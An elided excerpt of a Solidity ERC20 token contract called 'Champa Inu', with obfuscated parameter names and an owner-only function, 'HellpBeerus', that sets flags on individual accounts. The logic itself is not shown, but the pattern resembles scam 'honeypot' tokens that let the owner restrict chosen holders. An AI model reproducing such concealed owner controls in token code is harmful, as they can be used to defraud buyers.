...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address creator_, bool house10, bool house02, uint256 house09) {
        _name = name_;
        _symbol = symbol_;
        tXs = house09;
    ...
    function HellpBeerus(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
...
contract ERC20Champa is Context, ERC20 {
    constructor(
        ...
        _UniverseSix(owner, initialSupply, house06, house7);
    }
}

contract ChampaInu is ERC20Champa {
    constructor() ERC20Champa("Champa Inu", "CHAMPA", false, true, 1000, 23, msg.sender, 20000000000 * 10 ** 18, msg.sender, 72) {
    }
}